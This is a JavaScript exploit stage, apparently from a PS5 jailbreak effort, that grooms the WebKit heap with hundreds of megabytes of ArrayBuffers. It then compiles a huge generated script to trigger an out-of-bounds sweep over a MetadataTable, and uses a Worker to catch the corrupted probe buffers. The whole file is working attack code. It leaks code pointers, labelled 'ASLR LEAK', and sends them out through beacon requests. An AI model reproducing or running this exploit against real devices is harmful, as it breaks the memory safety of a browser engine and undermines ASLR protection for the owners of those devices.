// p398 - MASS MAP: pre-map 500MB, place probes in sweep path, race Worker
//
// FACTS FROM DEVICE:
// - PS5 WebContent can allocate ~1200MB of 100KB ABs before OOM
// - Sweep is 4.3GB forward from MetadataTable (always wraps 2^32)
// - Workers are threads: SIGSEGV kills everything
// - MADV_FREE keeps virtual mappings after free; page faults on re-access
//
// STRATEGY:
// 1. Allocate 50 "low pads" (5MB) at lowest marge addresses -- landing zone
// 2. Allocate 20 probes (2MB) filled with 0x42 -- detection layer
// 3. Allocate 5000 "high pads" (500MB) -- forward sweep runway
// 4. Transfer probes to Worker
// 5. Free low pads + high pads (MADV_FREE: virtual stays, physical reclaimable)
// 6. GC to finalize
// 7. Worker tight-polls probes
// 8. Build blob + compile IIFE
// 9. MetadataTable fills freed low-pad slot (lowest marge address)
// 10. Sweep forward: 5MB freed -> 2MB probes (HIT!) -> 500MB freed -> crash
// 11. Worker has ~50ms between probe corruption and process death
//
// Peak physical: ~700MB during alloc, ~250MB at compile, grows during sweep
// Beacon prefix: V398-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V398-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {}
  }

  B('BOOT');

  var AB_SIZE = 100112;

  // === Phase 1: Landing zone (low addresses) ===
  var lowPads = [];
  for (var i = 0; i < 50; i++) {
    try { lowPads.push(new ArrayBuffer(AB_SIZE)); } catch(e) { break; }
  }
  B('LOW-' + lowPads.length);

  // === Phase 2: Probes (just above landing zone) ===
  var NPROBE = 20;
  var probeABs = [];
  for (var i = 0; i < NPROBE; i++) {
    try {
      var ab = new ArrayBuffer(AB_SIZE);
      var v = new Uint8Array(ab);
      for (var j = 0; j < AB_SIZE; j++) v[j] = 0x42;
      probeABs.push(ab);
    } catch(e) { break; }
  }
  B('PROBES-' + probeABs.length);

  // === Phase 3: High pads (forward sweep runway, 700MB) ===
  var highPads = [];
  var hTarget = 7000;
  for (var i = 0; i < hTarget; i++) {
    try { highPads.push(new ArrayBuffer(AB_SIZE)); } catch(e) { break; }
    if ((i+1) % 1000 === 0) B('HIGH-' + Math.round((i+1) * AB_SIZE / 1048576) + 'MB');
  }
  B('RUNWAY-' + Math.round(highPads.length * AB_SIZE / 1048576) + 'MB-N' + highPads.length);

  // === Phase 4: Worker ===
  var workerCode = function() {
    var views = [];
    var bu = '';
    var polling = false;
    var hc = 0;
    var hp = {};

    function W(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', bu + '/beacon/V398-W-' + tag + '?t=' + Date.now(), false);
        x.send('');
      } catch(e) {}
    }
    function h2(v) { return (v<16?'0':'')+v.toString(16); }
    function hN(a,o,n) { var s=''; for(var i=0;i<n&&(o+i)<a.length;i++)s+=h2(a[o+i]); return s; }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') { bu = e.data.bu; W('ALIVE'); return; }

      if (e.data.cmd === 'probes') {
        var abs = e.data.buffers;
        for (var i = 0; i < abs.length; i++) views.push(new Uint8Array(abs[i]));
        var ok = 0;
        for (var i = 0; i < views.length; i++) {
          if (views[i][0]===0x42 && views[i][24]===0x42 && views[i][68]===0x42) ok++;
        }
        W('GOT-' + views.length + '-OK' + ok);
        self.postMessage({ ready: true });
        return;
      }

      if (e.data.cmd === 'poll') {
        polling = true;
        W('POLL-GO');
        var iter = 0;
        while (polling) {
          iter++;
          for (var pi = 0; pi < views.length; pi++) {
            var v = views[pi];
            // Check 7 key offsets across 3 entry strides
            if (v[0]!==0x42||v[24]!==0x42||v[64]!==0x42||v[68]!==0x42||
                v[112]!==0x42||v[136]!==0x42||v[224]!==0x42) {
              if (!hp[pi]) {
                hp[pi] = true;
                hc++;
                // IMMEDIATE beacon -- we have ~50ms before crash
                W('HIT-P'+pi+'-I'+iter);
                // Entry 0: link bytes (0-11)
                W('P'+pi+'-L0-'+hN(v,0,12));
                // Entry 0: thunk/code ptr (24-31) = ASLR LEAK
                W('P'+pi+'-T0-'+hN(v,24,8));
                // Entry 0: callType+bytecodeIndex (64-71)
                W('P'+pi+'-B0-'+hN(v,64,8));
                // Entry 1: thunk (136-143)
                W('P'+pi+'-T1-'+hN(v,136,8));
                // Entry 1: bits+idx (176-183)
                W('P'+pi+'-B1-'+hN(v,176,8));
                // Entry 2: thunk (248-255)
                W('P'+pi+'-T2-'+hN(v,248,8));
                // Non-0x42 count in first 1000 bytes
                var nz = 0;
                for (var b = 0; b < 1000; b++) if (v[b]!==0x42) nz++;
                W('P'+pi+'-NZ1K-'+nz);
                // m_bytecodeIndex from entries 0,1,2 (at +68, +180, +292)
                var idx0 = v[68]|(v[69]<<8)|(v[70]<<16)|(v[71]<<24);
                var idx1 = v[180]|(v[181]<<8)|(v[182]<<16)|(v[183]<<24);
                var idx2 = v[292]|(v[293]<<8)|(v[294]<<16)|(v[295]<<24);
                W('P'+pi+'-IDX-'+idx0+'-'+idx1+'-'+idx2);
              }
            }
          }
          if (iter % 200000 === 0) W('TICK-'+Math.round(iter/1e6)+'M-H'+hc);
        }
        return;
      }

      if (e.data.cmd === 'stop') {
        polling = false;
        W('STOP-H'+hc);
        var total = 0;
        for (var pi = 0; pi < views.length; pi++) {
          var v = views[pi];
          var nz = 0;
          for (var b = 0; b < v.length; b++) if (v[b]!==0x42) nz++;
          if (nz > 0) {
            total++;
            if (total <= 20) {
              W('FS-P'+pi+'-NZ'+nz);
              for (var en = 0; en < 5; en++) {
                var off = en*112;
                if (off+72>v.length) break;
                W('FE-P'+pi+'-E'+en+'-T'+hN(v,off+24,8)+'-B'+hN(v,off+64,8));
              }
            }
          }
        }
        W('FSCAN-'+total+'-OF-'+views.length);
        self.postMessage({done:true,total:total});
      }
    };
  };

  var wBlob = new Blob(['('+workerCode.toString()+')()'], {type:'application/javascript'});
  var worker = new Worker(URL.createObjectURL(wBlob));
  worker.postMessage({cmd:'init', bu: location.protocol+'//'+location.host});

  // Transfer probes to Worker (neutered on main thread, Worker owns backing stores)
  var tlist = probeABs.slice();
  worker.postMessage({cmd:'probes', buffers: probeABs}, tlist);
  probeABs = null;
  B('TRANSFERRED');

  // === Phase 5: Free landing zone + high pads ===
  // Low pads freed first -> LIFO means they're reused LAST by bitfit
  // High pads freed after -> reused FIRST
  // We want MetadataTable in the low-pad region, so free high pads first:
  for (var i = 0; i < highPads.length; i++) highPads[i] = null;
  highPads = null;
  B('HIGH-FREED');
  // Now free low pads (these are freed LAST = reused FIRST by LIFO)
  for (var i = 0; i < lowPads.length; i++) lowPads[i] = null;
  lowPads = null;
  B('LOW-FREED');

  worker.onmessage = function(e) {
    if (e.data.ready) {
      B('WORKER-READY');

      // === Phase 6: Aggressive GC ===
      var gcR = 0;
      function gc() {
        for (var j = 0; j < 5000; j++) new ArrayBuffer(4096);
        for (var j = 0; j < 1000; j++) new Array(50).fill(gcR);
        gcR++;
        if (gcR < 60) setTimeout(gc, 10);
        else {
          B('GC-DONE');
          // Start polling, then build after short delay
          worker.postMessage({cmd:'poll'});
          setTimeout(build, 300);
        }
      }
      gc();
    }
    if (e.data.done) {
      B('FINAL-'+e.data.total);
    }
  };

  function build() {
    B('BUILD');
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var cc = 'a();'.repeat(CHUNK);
    var p = ['(function(a){if(window.____x398){'];
    for (var c = 0; c < nC; c++) p.push(cc);
    p.push('a();'.repeat(rem));
    p.push('}})(function(){});window.__p398ok=true;');
    cc = null;
    var blob = new Blob(p, {type:'application/javascript'});
    B('BLOB-'+Math.round(blob.size/1048576)+'MB');
    p = null;
    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onload = function() {
      B('COMPILED-'+(window.__p398ok?'OK':'FAIL'));
      B('SURVIVED');
      worker.postMessage({cmd:'stop'});
    };
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
